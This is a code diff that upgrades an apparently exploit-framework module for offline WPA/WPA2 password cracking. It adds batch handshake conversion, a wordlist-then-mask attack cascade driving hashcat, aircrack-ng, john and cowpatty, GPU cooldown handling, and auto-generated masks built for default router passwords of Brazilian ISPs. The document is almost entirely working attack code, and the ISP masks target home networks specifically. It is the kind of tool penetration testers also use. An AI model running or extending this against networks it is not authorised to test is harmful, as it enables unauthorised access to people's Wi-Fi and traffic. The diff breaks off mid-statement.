@@ -23,7 +23,11 @@ Input formats accepted:
 
 The module automatically converts formats as needed (hcxpcapngtool).
 
-Version: 1.0.0
+Inspired workflow integrations (native, no external bridges):
+  - HashCater: attack_flow both, smart ISP masks, GPU thermal/cooldown
+  - Cap2Hash: batch PCAP→HC22000 conversion with skip/cleanup
+
+Version: 2.0.0
 """
 from __future__ import annotations
 
@@ -86,6 +90,198 @@ _HASH_MODE_WPA_EAPOL  = 22000   # WPA-EAPOL-PBKDF2 (M1+M2 pair)
 _HASH_MODE_WPA_PMKID  = 22001   # WPA-PMKID-PBKDF2
 _HASH_MODE_HCCAPX     = 2500    # legacy .hccapx
 
+_CAPTURE_GLOBS = ("*.pcap", "*.cap", "*.pcapng")
+_HASH_GLOBS = ("*.hc22000", "*.22000", "*.hash")
+
+# ---------------------------------------------------------------------------
+# Session logging, GPU thermal, smart masks (HashCater + Cap2Hash native)
+# ---------------------------------------------------------------------------
+
+class _SessionLog:
+    """Optional session log file (HashCater-style long runs)."""
+
+    def __init__(self, path: str) -> None:
+        self._path = Path(path).expanduser() if path else None
+        if self._path:
+            self._path.parent.mkdir(parents=True, exist_ok=True)
+
+    def write(self, message: str) -> None:
+        if not self._path:
+            return
+        ts = time.strftime("%H:%M:%S")
+        try:
+            with self._path.open("a", encoding="utf-8") as fh:
+                fh.write(f"[{ts}] {message}\n")
+        except OSError as exc:
+            logger.debug("session log write failed: %s", exc)
+
+
+def _get_gpu_temperature() -> Optional[int]:
+    """Read GPU temperature via nvidia-smi or Linux hwmon (°C)."""
+    if shutil.which("nvidia-smi"):
+        try:
+            r = subprocess.run(
+                ["nvidia-smi", "--query-gpu=temperature.gpu",
+                 "--format=csv,noheader,nounits"],
+                capture_output=True, text=True, timeout=10,
+            )
+            if r.stdout.strip():
+                return int(r.stdout.strip().splitlines()[0].strip())
+        except (ValueError, subprocess.SubprocessError):
+            pass
+
+    for hwmon in Path("/sys/class/drm").glob("card*/device/hwmon/hwmon*/temp1_input"):
+        try:
+            milli = int(hwmon.read_text().strip())
+            return milli // 1000
+        except (ValueError, OSError):
+            continue
+    return None
+
+
+def _wait_gpu_cooldown(retain_c: int, slog: _SessionLog) -> None:
+    """Wait until GPU drops below retain_c (HashCater Wait-GpuCooldown)."""
+    if retain_c <= 0:
+        return
+    while True:
+        temp = _get_gpu_temperature()
+        if temp is None or temp <= retain_c:
+            return
+        msg = f"[COOLDOWN] GPU at {temp}°C — aguardando ≤{retain_c}°C…"
+        print_warning(f"  {msg}")
+        slog.write(msg)
+        time.sleep(30)
+
+
+def _hashcat_safety_args(temp_abort: int, workload: int) -> List[str]:
+    args: List[str] = []
+    if workload > 0:
+        args.extend(["-w", str(max(1, min(4, workload)))])
+    if temp_abort > 0:
+        args.append(f"--hwmon-temp-abort={temp_abort}")
+    return args
+
+
+def _generate_smart_masks(essid: str) -> List[str]:
+    """SSID + Brazilian ISP heuristic masks (HashCater + real BR patterns)."""
+    masks: List[str] = []
+    essid_up = (essid or "").upper()
+    base = re.sub(r"[^a-zA-Z0-9]", "", essid or "").lower()
+
+    masks.extend(["?d?d?d?d?d?d?d?d", "?d?d?d?d?d?d?d?d?d?d"])
+
+    if essid_up.startswith("VIVO"):
+        masks.extend(["vivo?d?d?d?d", "VIVO?d?d?d?d", "?d?d?d?d?d?d?d?d?d"])
+    elif essid_up.startswith("CLARO"):
+        masks.extend(["claro?d?d?d?d", "CLARO?d?d?d?d", "?u?l?l?l?l?d?d?d?d"])
+    elif "TP-LINK" in essid_up or essid_up.startswith("TP_LINK"):
+        masks.extend(["tplink?d?d?d", "admin?d?d?d?d", "?d?d?d?d?d?d?d?d"])
+    elif essid_up.startswith("NET_") or essid_up.startswith("NET-"):
+        masks.extend(["net?d?d?d?d", "?d?d?d?d?d?d?d?d"])
+    elif essid_up.startswith("WIFI") or essid_up.startswith("WI-FI"):
+        masks.extend(["wifi?d?d?d?d", "?d?d?d?d?d?d?d?d"])
+    elif essid_up.startswith("OI_") or essid_up.startswith("OI "):
+        masks.extend(["oi?d?d?d?d", "?d?d?d?d?d?d?d?d"])
+    elif essid_up.startswith("TIM_") or "TIM " in essid_up:
+        masks.extend(["tim?d?d?d?d", "?d?d?d?d?d?d?d?d"])
+    elif essid_up.startswith("GVT") or essid_up.startswith("SKY"):
+        masks.extend(["?l?l?l?l?d?d?d?d", "?d?d?d?d?d?d?d?d"])
+    elif essid_up.startswith("AZUL") or "AZULLAR" in essid_up:
+        masks.extend(["azul?d?d?d?d", "?l?l?l?l?l?l?d?d"])
+
+    if len(base) >= 4:
+        masks.extend([f"{base}@?d?d?d", f"{base}@?d?d?d?d"])
+
+    seen: Set[str] = set()
+    ordered: List[str] = []
+    for m in masks:
+        if m not in seen:
+            seen.add(m)
+            ordered.append(m)
+    return ordered
+
+
+def _resolve_mask_list(essid: str, masks_opt: str, smart_masks: bool) -> List[str]:
+    manual = [m.strip() for m in masks_opt.split(",") if m.strip()]
+    if manual:
+        return manual
+    if smart_masks and essid:
+        return _generate_smart_masks(essid)
+    return []
+
+
+def _batch_convert_directory(
+    dir_path: Path,
+    skip_existing: bool = True,
+    slog: Optional[_SessionLog] = None,
+) -> Dict[str, int]:
+    """Cap2Hash-style batch PCAP/CAP → .hc22000 with skip and cleanup."""
+    stats = {"total": 0, "converted": 0, "skipped": 0, "failed": 0}
+    if not shutil.which("hcxpcapngtool"):
+        print_error("hcxpcapngtool not found — install hcxtools.")
+        return stats
+
+    files: List[Path] = []
+    for pat in _CAPTURE_GLOBS:
+        files.extend(sorted(dir_path.glob(pat)))
+    stats["total"] = len(files)
+    if not files:
+        print_warning(f"Nenhum .pcap/.cap/.pcapng em {dir_path}")
+        return stats
+
+    print_status(f"[Cap2Hash] {len(files)} captura(s) em {dir_path}")
+    for cap in files:
+        out_hash = cap.with_suffix(".hc22000")
+        if skip_existing and out_hash.exists() and out_hash.stat().st_size > 0:
+            print_info(f"  [SKIP] {out_hash.name} já existe")
+            stats["skipped"] += 1
+            if slog:
+                slog.write(f"[SKIP] {out_hash}")
+            continue
+
+        print_status(f"  [*] Convertendo: {cap.name}")
+        r = subprocess.run(
+            ["hcxpcapngtool", "-o", str(out_hash), str(cap)],
+            capture_output=True, text=True,
+        )
+        if r.returncode == 0 and out_hash.exists() and out_hash.stat().st_size > 0:
+            print_success(f"  [+] {cap.name} → {out_hash.name}")
+            stats["converted"] += 1
+            if slog:
+                slog.write(f"[+] {cap.name} -> {out_hash.name}")
+        else:
+            print_error(f"  [!] Falha: {cap.name}")
+            out_hash.unlink(missing_ok=True)
+            stats["failed"] += 1
+            if slog:
+                slog.write(f"[!] failed {cap.name}")
+
+    print_info("=" * 44)
+    print_success(f"  Convertidos: {stats['converted']} | Pulados: {stats['skipped']} | Falhas: {stats['failed']}")
+    print_info("=" * 44)
+    return stats
+
+
+def _collect_input_paths(input_file: str, input_dir: str) -> List[Path]:
+    """Resolve single file or batch directory inputs."""
+    dir_raw = input_dir.strip()
+    if dir_raw:
+        d = Path(dir_raw).expanduser()
+        if not d.is_dir():
+            raise FileNotFoundError(f"input_dir not found: {d}")
+        paths: List[Path] = []
+        for pat in _CAPTURE_GLOBS + _HASH_GLOBS + ("*.hccapx",):
+            paths.extend(sorted(d.glob(pat)))
+        return list(dict.fromkeys(paths))  # dedupe, preserve order
+
+    file_raw = input_file.strip()
+    if not file_raw:
+        return []
+    p = Path(file_raw).expanduser()
+    if not p.exists():
+        raise FileNotFoundError(f"input_file not found: {p}")
+    return [p]
+
 # ---------------------------------------------------------------------------
 # Format detection & conversion
 # ---------------------------------------------------------------------------
@@ -99,6 +295,8 @@ def _detect_file_type(path: Path) -> str:
         return "pcapng"
     if suffix in (".hccapx",):
         return "hccapx"
+    if suffix in (".hc22000", ".22000", ".hash"):
+        return "hash22000"
     # Inspect first bytes
     try:
         header = path.read_bytes()[:8]
@@ -334,6 +532,77 @@ def _run_hashcat(
 
     # Also check potfile
     _show_hashcat_cracked(hash_file, mode, result)
+
+
+def _run_hashcat_mask_chain(
+    hash_path: Path,
+    mode: int,
+    masks: List[str],
+    dev_args: List[str],
+    extra_base: List[str],
+    mask_runtime: int,
+    cooldown_s: int,
+    gpu_temp_retain: int,
+    result: CrackResult,
+    slog: _SessionLog,
+    verbose: bool,
+) -> None:
+    """Run prioritized mask chain with per-mask --runtime (HashCater-style)."""
+    if not masks:
+        return
+
+    for mask in masks:
+        if result.found:
+            break
+
+        _wait_gpu_cooldown(gpu_temp_retain, slog)
+        extra = list(extra_base)
+        if mask_runtime > 0:
+            extra.extend(["--runtime", str(mask_runtime)])
+
+        print_status(f"  [MASK] {mask}" + (f" (max {mask_runtime}s)" if mask_runtime > 0 else ""))
+        slog.write(f"[MASK] {mask}")
+
+        cmd = [
+            "hashcat", "-m", str(mode), "-a", "3",
+            "--status", "--status-timer=5",
+            "--logfile-disable",
+            str(hash_path), mask,
+        ] + dev_args + extra
+
+        print_info(f"  CMD: {' '.join(cmd)}")
+        try:
+            proc = subprocess.Popen(
+                cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
+                text=True, bufsize=1,
+            )
+            for line in proc.stdout:
+                line = line.rstrip()
+                result.raw_lines.append(line)
+                if verbose:
+                    print_info(f"  {line}")
+            proc.wait()
+        except FileNotFoundError:
+            print_error("hashcat not found in PATH")
+            result.status = "error"
+            return
+        except Exception as exc:
+            logger.debug("hashcat mask chain: %s", exc)
+            result.status = "error"
+            return
+
+        _show_hashcat_cracked(hash_path, mode, result)
+        if result.found:
+            slog.write(f"[CRACKED-MASK] {mask}")
+            break
+
+        temp = _get_gpu_temperature()
+        if temp is not None:
+            slog.write(f"[GPU] {temp}°C")
+        if cooldown_s > 0:
+            print_status(f"  [COOLDOWN] {cooldown_s}s entre máscaras…")
+            slog.write(f"[COOLDOWN] sleep {cooldown_s}s")
+            time.sleep(cooldown_s)
 
 
 def _show_hashcat_cracked(hash_file: Path, mode: int, result: CrackResult) -> None:
@@ -845,15 +1114,16 @@ class Exploit(Exploit):
     __info__ = {
         "name": "WPA Crack Engine (multi-backend)",
         "description": (
-            "Offline WPA/WPA2 cracking with multiple backends: hashcat (GPU/CPU), "
-            "aircrack-ng, John the Ripper, cowpatty. Auto-converts pcap/pcapng to "
-            "the required format for each backend. Parses output and reports "
-            "found passwords. Supports custom wordlists, rules, and masks."
+            "Offline WPA/WPA2 cracking: hashcat (GPU/CPU), aircrack-ng, john, cowpatty. "
+            "Batch PCAP→HC22000 (Cap2Hash), attack cascade wordlist→smart masks "
+            "(HashCater), GPU thermal protection, multi-ESSID selection."
         ),
         "authors": ("Andre Henrique (@mrhenrike) | Uniao Geek",),
         "references": (
             "https://hashcat.net/wiki/doku.php?id=cracking_wpawpa2",
             "https://www.aircrack-ng.org/doku.php?id=cracking_wpa",
+            "https://github.com/Bl4nsk1/HashCater",
+            "https://github.com/Bl4nsk1/Cap2Hash",
         ),
         "devices": ("wifi", "WPA2", "WPA3", "offline-crack"),
     }
@@ -862,27 +1132,52 @@ class Exploit(Exploit):
         "auto",
         "Backend: auto | hashcat_gpu | hashcat_cpu | hashcat_auto | aircrack | john | cowpatty | list",
     )
-    input_file = OptString("", "Path to handshake pcap/pcapng or hash file (.hash/.22000/.hccapx)")
+    input_file = OptString("", "Handshake file: .pcap/.pcapng/.cap/.hash/.22000/.hc22000")
+    input_dir  = OptString(
+        "",
+        "Batch mode: directory with captures/hashes (processes all; Cap2Hash-style)",
+    )
     wordlist   = OptString(
         "/home/mrhenrike/Documentos/Projetos/WordListsForHacking/passwords/wlist_brasil.lst",
         "Path to wordlist file",
     )
     wl_order   = OptString(
         "random",
-        "Wordlist scan order: random (default, dynamic shuffle) | forward (1ª→última) | reverse (última→1ª)",
+        "Wordlist scan order: random (default) | forward | reverse",
+    )
+    attack_flow = OptString(
+        "wordlist",
+        "Attack cascade: wordlist | bruteforce | both (wordlist then masks)",
+    )
+    smart_masks = OptBool(
+        True,
+        "Auto-generate SSID/ISP-BR masks when masks empty (VIVO/CLARO/NET/WIFI…)",
     )
     essid      = OptString(
         "",
-        "Target ESSID: nome exato | all (todos) | 1,2,3 (índices) | 1-3 (range)\n"
-        "  Quando vazio e pcap tem múltiplos ESSIDs com handshake, o módulo lista e pede escolha.",
+        "Target ESSID: nome exato | all | 1,2,3 | 1-3 (vazio = lista se múltiplos)",
     )
-    rules      = OptString("", "Comma-separated rule files for hashcat (e.g. best64,dive) or 'none'")
-    use_rules  = OptBool(False, "Apply best64 rules to wordlist (adds ~64x candidates)")
-    masks      = OptString("", "Hashcat mask for brute-force (e.g. ?d?d?d?d?d?d?d?d for 8 digits)")
-    potfile    = OptString("", "Hashcat potfile path (empty = use default)")
-    timeout_s  = OptInteger(0, "Max cracking time in seconds (0 = unlimited)")
+    rules      = OptString("", "Comma-separated rule files for hashcat (best64,dive) or none")
+    use_rules  = OptBool(False, "Apply best64 rules to wordlist (~64x candidates)")
+    masks      = OptString(
+        "",
+        "Hashcat mask(s), comma-separated (e.g. ?d?d?d?d?d?d?d?d). Empty + smart_masks → auto",
+    )
+    mask_runtime_s = OptInteger(
+        1800,
+        "Max seconds per mask in bruteforce chain (0 = unlimited)",
+    )
+    cooldown_s = OptInteger(60, "Pause between hashcat runs for GPU cooling (seconds)")
+    gpu_temp_abort = OptInteger(80, "hashcat --hwmon-temp-abort (°C, 0=disable)")
+    gpu_temp_retain = OptInteger(70, "Wait until GPU ≤ this °C before next run (0=skip)")
+    workload   = OptInteger(2, "hashcat workload profile -w (1=low … 4=nightmare)")
+    log_file   = OptString("", "Session log path (HashCater-style)")
+    skip_converted = OptBool(True, "Cap2Hash: skip if .hc22000 already exists beside capture")
+    convert_only = OptBool(False, "Only convert PCAP/CAP→.hc22000 (batch with input_dir)")
+    potfile    = OptString("", "Hashcat potfile path (empty = default)")
+    timeout_s  = OptInteger(0, "Global max cracking time in seconds (0 = unlimited)")
     verbose    = OptBool(False, "Show raw backend output line by line")
-    check_only = OptBool(False, "Only check/convert input file and show info, don't crack")
+    check_only = OptBool(False, "Only check/convert and show info, don't crack")
 
     # ------------------------------------------------------------------
 
@@ -898,129 +1193,202 @@ class Exploit(Exploit):
 
     def run(self) -> None:
         backend_id = str(self.backend).strip().lower()
+        slog = _SessionLog(str(self.log_file).strip())
 
-        # ---- list mode ----
         if backend_id == "list":
             self._list_backends()
             return
 
-        input_path = Path(str(self.input_file).strip())
-        wordlist_path = Path(str(self.wordlist).strip())
+        # ── Cap2Hash batch convert ─────────────────────────────────────
+        if bool(self.convert_only):
+            dir_raw = str(self.input_dir).strip()
+            if dir_raw:
+                _batch_convert_directory(
+                    Path(dir_raw).expanduser(),
+                    skip_existing=bool(self.skip_converted),
+                    slog=slog,
+                )
+                return
+            input_path = Path(str(self.input_file).strip()).expanduser()
+            if not input_path.exists():
+                print_error(f"input_file not found: {input_path}")
+                return
+            ft = _detect_file_type(input_path)
+            if ft not in ("pcap", "pcapng"):
+                print_error("convert_only requires .pcap/.cap/.pcapng input")
+                return
+            out = input_path.with_suffix(".hc22000")
+            if bool(self.skip_converted) and out.exists() and out.stat().st_size > 0:
+                print_info(f"[SKIP] {out.name} já existe")
+                return
+            r = subprocess.run(
+                ["hcxpcapngtool", "-o", str(out), str(input_path)],
+                capture_output=True, text=True,
+            )
+            if r.returncode == 0 and out.exists() and out.stat().st_size > 0:
+                print_success(f"[+] {input_path.name} → {out.name}")
+                slog.write(f"[+] {input_path.name} -> {out.name}")
+            else:
+                out.unlink(missing_ok=True)
+                print_error(f"Conversão falhou: {input_path.name}")
+            return
 
-        # Validate input
-        if not str(self.input_file).strip():
-            print_error("Set input_file to a handshake pcap/pcapng or hash file.")
+        # ── Resolve inputs (single file or batch dir) ──────────────────
+        try:
+            input_paths = _collect_input_paths(
+                str(self.input_file).strip(),
+                str(self.input_dir).strip(),
+            )
+        except FileNotFoundError as exc:
+            print_error(str(exc))
             self._show_usage()
             return
-        if not input_path.exists():
-            print_error(f"Input file not found: {input_path}")
-            return
-        if not wordlist_path.exists() and not bool(self.masks):
-            print_warning(f"Wordlist not found: {wordlist_path}")
-            print_info("Continuing — will use mask attack if masks is set.")
 
-        # Detect file type
+        if not input_paths:
+            print_error("Defina input_file ou input_dir.")
+            self._show_usage()
+            return
+
+        wordlist_path = Path(str(self.wordlist).strip()).expanduser()
+        attack_flow = str(self.attack_flow).strip().lower() or "wordlist"
+        if attack_flow not in ("wordlist", "bruteforce", "both"):
+            print_warning(f"attack_flow inválido '{attack_flow}' — usando 'wordlist'")
+            attack_flow = "wordlist"
+
+        batch_stats = {"processed": 0, "cracked": 0, "failed": 0}
+        all_batch_found: List[tuple] = []
+
+        for input_path in input_paths:
+            batch_stats["processed"] += 1
+            if len(input_paths) > 1:
+                print_info("")
+                print_success(f"══ Arquivo [{batch_stats['processed']}/{len(input_paths)}]: {input_path.name} ══")
+                slog.write(f"[FILE] {input_path}")
+
+            found_here = self._crack_single_input(
+                input_path, wordlist_path, backend_id, attack_flow, slog,
+            )
+            if found_here:
+                batch_stats["cracked"] += 1
+                all_batch_found.extend(found_here)
+            else:
+                batch_stats["failed"] += 1
+
+        if len(input_paths) > 1:
+            print_info("")
+            print_success("══ RESUMO DO LOTE ══")
+            print_success(
+                f"  Processados: {batch_stats['processed']} | "
+                f"Crackeados: {batch_stats['cracked']} | "
+                f"Falhas: {batch_stats['failed']}"
+            )
+            slog.write(
+                f"[DONE] processed={batch_stats['processed']} "
+                f"cracked={batch_stats['cracked']} failed={batch_stats['failed']}"
+            )
+            for essid_r, pwd, src in all_batch_found:
+                print_success(f"    {essid_r!r} → {pwd!r}  [{src}]")
+
+    def _crack_single_input(
+        self,
+        input_path: Path,
+        wordlist_path: Path,
+        backend_id: str,
+        attack_flow: str,
+        slog: _SessionLog,
+    ) -> List[tuple]:
+        """Crack one capture/hash file; return list of (essid, pwd, source) found."""
+        if not wordlist_path.exists() and attack_flow in ("wordlist", "both") and not str(self.masks).strip():
+            if not bool(self.smart_masks) and attack_flow != "bruteforce":
+                print_warning(f"Wordlist not found: {wordlist_path}")
+
         file_type = _detect_file_type(input_path)
         print_status(f"Input: {input_path.name} ({file_type})")
 
-        # Check-only mode
         if bool(self.check_only):
             self._inspect_input(input_path, file_type)
-            return
+            return []
 
-        # ── Multi-ESSID selection ──────────────────────────────────────
-        # For pcap/pcapng: detect all ESSIDs with valid handshakes and
-        # let the user choose which to crack.
-        # For hash files: list contained ESSIDs.
         essid_spec = str(self.essid).strip()
         essids_to_crack: List[str] = []
 
         if file_type in ("pcap", "pcapng"):
             detected = _detect_essids_with_handshakes(input_path)
-            if detected:
-                essids_to_crack = _resolve_essid_selection(detected, essid_spec)
-            else:
-                # No ESSID info → pass essid_spec as-is (may be empty for hashcat)
-                essids_to_crack = [essid_spec] if essid_spec else [""]
+            essids_to_crack = (
+                _resolve_essid_selection(detected, essid_spec) if detected
+                else ([essid_spec] if essid_spec else [""])
+            )
         elif file_type == "hash22000":
             detected = _detect_essids_from_hash(input_path)
-            if detected:
-                essids_to_crack = _resolve_essid_selection(detected, essid_spec)
-            else:
-                essids_to_crack = [essid_spec] if essid_spec else [""]
+            essids_to_crack = (
+                _resolve_essid_selection(detected, essid_spec) if detected
+                else ([essid_spec] if essid_spec else [""])
+            )
         else:
             essids_to_crack = [essid_spec] if essid_spec else [""]
 
-        # Prepare wordlist with requested scan order
         order = str(self.wl_order).strip().lower() or "random"
         prepared_wordlist = wordlist_path
         _tmp_wordlist: Optional[Path] = None
-        if wordlist_path.exists() and not bool(self.masks):
+        if wordlist_path.exists() and attack_flow in ("wordlist", "both"):
             try:
                 prepared_wordlist = _prepare_wordlist(wordlist_path, order)
                 if prepared_wordlist != wordlist_path:
-                    _tmp_wordlist = prepared_wordlist  # track for cleanup
+                    _tmp_wordlist = prepared_wordlist
             except MemoryError:
-                print_warning("  Wordlist too large to shuffle in memory — using FORWARD order.")
+                print_warning("  Wordlist grande — ordem FORWARD.")
                 prepared_wordlist = wordlist_path
             except Exception as exc:
-                print_warning(f"  Wordlist prep failed ({exc}) — using FORWARD order.")
+                print_warning(f"  Wordlist prep failed ({exc})")
                 prepared_wordlist = wordlist_path
 
-        # Resolve backend
-        if backend_id == "auto":
-            backends = self._auto_order()
-        else:
-            backends = [backend_id]
+        backends = self._auto_order() if backend_id == "auto" else [backend_id]
+        all_found: List[tuple] = []
 
         try:
-            all_found: List[tuple] = []
-
             for target_essid in essids_to_crack:
                 if target_essid:
-                    sep = f"{'─'*60}"
+                    sep = "─" * 60
                     print_info(f"\n{sep}")
                     print_success(f"  Cracking ESSID: \033[1m{target_essid}\033[0m")
                     print_info(sep)
+                    slog.write(f"[ESSID] {target_essid}")
 
                 for be in backends:
                     if be not in BACKENDS:
-                        print_error(f"Unknown backend {be!r}. Use 'list' to see options.")
-                        return
+                        print_error(f"Unknown backend {be!r}")
+                        return all_found
                     if BACKENDS[be]["bin"] and not shutil.which(BACKENDS[be]["bin"]):
-                        print_warning(f"Backend {be!r} not available ({BACKENDS[be]['bin']} not found). Skipping.")
+                        print_warning(f"Backend {be!r} indisponível — pulando.")
                         continue
-                    print_success(f"Backend: {be} — {BACKENDS[be]['desc']}")
+
+                    print_success(f"Backend: {be} — flow={attack_flow}")
                     result = CrackResult()
-                    # Temporarily override essid for this iteration
                     _saved_essid = self.essid
                     self.essid = target_essid or self.essid
-                    self._run_backend(be, input_path, prepared_wordlist, file_type, result)
+                    self._run_backend(
+                        be, input_path, prepared_wordlist, file_type, result,
+                        attack_flow, slog,
+                    )
                     self.essid = _saved_essid
                     self._print_summary(be, result)
                     if result.found:
                         all_found.extend(result.found)
-                        break  # found for this ESSID → next ESSID
+                        slog.write(f"[CRACKED] {target_essid} {result.found}")
+                        break
                     if backend_id != "auto":
                         break
 
-            # Final summary when multiple ESSIDs
-            if len(essids_to_crack) > 1:
-                print_info("")
-                print_success(f"  ══ RESULTADO FINAL ({len(essids_to_crack)} ESSIDs) ══")
-                print_success(f"  Crackeados: {len(all_found)}/{len(essids_to_crack)}")
-                for essid_r, pwd, src in all_found:
-                    print_success(f"    {essid_r!r:<35}  →  {pwd!r}  [{src}]")
-                if len(all_found) < len(essids_to_crack):
-                    missing = len(essids_to_crack) - len(all_found)
-                    print_warning(f"  {missing} ESSID(s) sem crack — tente outra wordlist.")
-
+            if len(essids_to_crack) > 1 and all_found:
+                print_success(f"  Crackeados: {len(all_found)}/{len(essids_to_crack)} neste arquivo")
         finally:
             if _tmp_wordlist and _tmp_wordlist.exists():
                 try:
                     _tmp_wordlist.unlink()
-                except Exception:
+                except OSError:
                     pass
+
+        return all_found
 
     # ------------------------------------------------------------------
     # Backend dispatcher
@@ -1033,38 +1401,51 @@ class Exploit(Exploit):
         wordlist: Path,
         file_type: str,
         result: CrackResult,
+        attack_flow: str = "wordlist",
+        slog: Optional[_SessionLog] = None,
     ) -> None:
         tmp_dir = Path(tempfile.mkdtemp(prefix="wxf_crack_"))
         essid = str(self.essid).strip()
-        timeout = int(self.timeout_s)
+        slog = slog or _SessionLog("")
 
         try:
             if be in ("hashcat_gpu", "hashcat_cpu", "hashcat_auto"):
-                self._run_hashcat_backend(be, input_path, wordlist, file_type, result, tmp_dir)
+                self._run_hashcat_backend(
+                    be, input_path, wordlist, file_type, result, tmp_dir,
+                    attack_flow, slog,
+                )
 
             elif be == "aircrack":
-                if file_type in ("pcap", "pcapng"):
-                    _run_aircrack(input_path, wordlist, essid, result)
+                if attack_flow == "bruteforce":
+                    print_warning("aircrack-ng não suporta bruteforce por máscara — use hashcat.")
+                    result.status = "error"
+                elif file_type in ("pcap", "pcapng"):
+                    if attack_flow in ("wordlist", "both") and wordlist.exists():
+                        _run_aircrack(input_path, wordlist, essid, result)
+                    elif attack_flow == "both" and not result.found:
+                        print_info("  both: wordlist falhou — bruteforce requer backend hashcat.")
                 else:
-                    print_warning("aircrack-ng works best with pcap/pcapng. Converting not supported for this format.")
+                    print_warning("aircrack-ng requires pcap/pcapng.")
                     result.status = "error"
 
             elif be == "john":
-                john_file = _convert_for_john(input_path, tmp_dir) if file_type in ("pcap","pcapng") else input_path
-                if john_file is None:
-                    # Try via hash22000 conversion + john with direct format
-                    hash_f = _convert_to_hash22000(input_path, tmp_dir)
-                    john_file = hash_f or input_path
-                _run_john(john_file, wordlist, result, rules=bool(self.use_rules))
+                if attack_flow in ("wordlist", "both") and wordlist.exists():
+                    john_file = (
+                        _convert_for_john(input_path, tmp_dir)
+                        if file_type in ("pcap", "pcapng") else input_path
+                    )
+                    if john_file is None:
+                        hash_f = _convert_to_hash22000(input_path, tmp_dir)
+                        john_file = hash_f or input_path
+                    _run_john(john_file, wordlist, result, rules=bool(self.use_rules))
 
             elif be == "cowpatty":
-                if file_type in ("pcap", "pcapng"):
+                if file_type in ("pcap", "pcapng") and attack_flow in ("wordlist", "both"):
                     _run_cowpatty(input_path, wordlist, essid, result)
                 else:
-                    print_warning("cowpatty requires pcap/pcapng input.")
+                    print_warning("cowpatty requires pcap/pcapng.")
                     result.status = "error"
         finally:
-            # Cleanup temp files
             import shutil as _sh
             _sh.rmtree(tmp_dir, ignore_errors=True)
 
@@ -1076,22 +1457,27 @@ class Exploit(Exploit):
         file_type: str,
         result: CrackResult,
         tmp_dir: Path,
+        attack_flow: str = "wordlist",
+        slog: Optional[_SessionLog] = None,
     ) -> None:
-        # Device flags — Intel/AMD GPU require --force to bypass API warnings
+        slog = slog or _SessionLog("")
+        essid = str(self.essid).strip()
+
         if be == "hashcat_gpu":
-            dev_args = ["-D", "2", "--force"]   # D 2 = GPU (Intel Iris Xe, AMD, NVIDIA)
+            dev_args = ["-D", "2", "--force"]
         elif be == "hashcat_cpu":
             dev_args = ["-D", "1", "--force"]
-        else:  # hashcat_auto
-            dev_args = ["--force"]  # auto-detect best device
+        else:
+            dev_args = ["--force"]
 
-        # Extra args
+        dev_args.extend(_hashcat_safety_args(
+            int(self.gpu_temp_abort), int(self.workload),
+        ))
+
         extra: List[str] = []
-        # When running as root (sudo), pass user's potfile path explicitly
-        # so previously cracked hashes are recognized immediately.
-        _default_potfile = ""
         import os as _os
         sudo_user = _os.environ.get("SUDO_USER", "")
+        _default_potfile = ""
         if sudo_user:
             _default_potfile = f"/home/{sudo_user}/.local/share/hashcat/hashcat.potfile"
         elif _os.path.exists(_os.path.expanduser("~/.local/share/hashcat/hashcat.potfile")):
@@ -1101,11 +1487,8 @@ class Exploit(Exploit):
         if potfile_arg:
             extra.extend(["--potfile-path", potfile_arg])
         if int(self.timeout_s) > 0:
-            extra.extend(["--runtime", str(self.timeout_s)])
-        if bool(self.verbose):
-            extra.remove("--quiet") if "--quiet" in extra else None
+            extra.extend(["--runtime", str(int(self.timeout_s))])
 
-        # Rules
         rule_files: List[str] = []
         rules_raw = str(self.rules).strip()
         if rules_raw and rules_raw.lower() != "none":
@@ -1114,86 +1497,78 @@ class Exploit(Exploit):
                 if os.path.exists(r):
                     rule_files.append(r)
                 else:
-                    # Try standard hashcat rules path
-                    for d in ["/usr/share/hashcat/rules", "/usr/local/share/hashcat/rules"]:
+                    for d in ("/usr/share/hashcat/rules", "/usr/local/share/hashcat/rules"):
                         p = os.path.join(d, r if r.endswith(".rule") else r + ".rule")
                         if os.path.exists(p):
                             rule_files.append(p)
                             break
         if bool(self.use_rules) and not rule_files:
-            for d in ["/usr/share/hashcat/rules", "/usr/local/share/hashcat/rules"]:
+            for d in ("/usr/share/hashcat/rules", "/usr/local/share/hashcat/rules"):
                 p = os.path.join(d, "best64.rule")
                 if os.path.exists(p):
                     rule_files.append(p)
                     break
 
-        # Convert input to hashcat format
         hash_path = input_path
         mode = _HASH_MODE_WPA_EAPOL
 
         if file_type in ("pcap", "pcapng"):
-            print_status(f"  Converting {input_path.name} → WPA*02* format via hcxpcapngtool…")
-            converted = _convert_to_hash22000(input_path, tmp_dir)
-            if converted:
-                hash_path = converted
-                # Detect PMKID vs EAPOL
-                content = converted.read_text(errors="replace")
-                if "WPA*01*" in content:
-                    mode = _HASH_MODE_WPA_PMKID
-                    print_info("  Detected WPA*01* (PMKID) hashes → mode 22001")
-                else:
-                    mode = _HASH_MODE_WPA_EAPOL
-                    print_info("  Detected WPA*02* (EAPOL) hashes → mode 22000")
-                n = len([l for l in content.splitlines() if l.strip()])
-                print_info(f"  Hashes in file: {n}")
+            sidecar = input_path.with_suffix(".hc22000")
+            if sidecar.exists() and sidecar.stat().st_size > 0:
+                hash_path = sidecar
+                print_info(f"  Reutilizando {sidecar.name} (Cap2Hash skip)")
             else:
-                print_error("  Conversion failed. Is hcxpcapngtool installed?")
-                result.status = "error"
-                return
-        elif file_type == "hccapx":
-            mode = _HASH_MODE_HCCAPX
-            print_info(f"  Legacy .hccapx format → mode {mode}")
-        elif file_type == "hash22000":
+                print_status(f"  Convertendo {input_path.name} → .hc22000…")
+                converted = _convert_to_hash22000(input_path, tmp_dir)
+                if converted:
+                    hash_path = converted
+                else:
+                    print_error("  Conversão falhou — hcxpcapngtool instalado?")
+                    result.status = "error"
+                    return
+
+        if hash_path.suffix.lower() in (".hc22000", ".22000", ".hash") or file_type == "hash22000":
             content = hash_path.read_text(errors="replace")
             if "WPA*01*" in content:
                 mode = _HASH_MODE_WPA_PMKID
             elif "WPA*02*" in content:
                 mode = _HASH_MODE_WPA_EAPOL
-            n = len([l for l in content.splitlines() if l.strip()])
+            n = len([ln for ln in content.splitlines() if ln.strip()])
             print_info(f"  Hash mode: {mode} | Hashes: {n}")
+        elif file_type == "hccapx":
+            mode = _HASH_MODE_HCCAPX
 
-        # Mask attack
-        mask = str(self.masks).strip()
-        if mask:
-            print_status(f"  Mask attack: {mask}")
-            mask_cmd = [
-                "hashcat", "-m", str(mode), "-a", "3",
